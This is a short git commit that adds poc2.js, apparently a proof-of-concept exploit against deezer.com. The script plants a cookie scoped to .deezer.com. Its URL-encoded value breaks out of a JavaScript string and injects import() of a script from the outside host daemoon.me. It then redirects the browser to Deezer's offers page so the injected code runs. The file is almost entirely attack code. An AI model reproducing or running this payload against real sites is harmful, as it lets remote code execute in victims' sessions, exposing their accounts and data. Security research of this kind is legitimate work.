afe741f33caf592d03b04ba0c67d8694209c3c71
Badr <macbookprom2@Badreddine-Belkadi.local>
2026-01-27 01:03:13 +0100

    small changes

---
+++ poc2.js
@@ -0,0 +1,3 @@
+document.cookie = "dzr_uniq_id=dzr_uniq_id_frbf5046debd4d4561fddaed1581ba5331af4c3b%27%7D%29%0Aimport%28%22https%3A%2F%2Fdaemoon.me%2Fpoc.js%22%29%3Bwindow.dataLayer.push%28%7B%27badr%27%3A%27badr; domain=.deezer.com;"
+
+document.location.href= "https://www.deezer.com/en/offers"
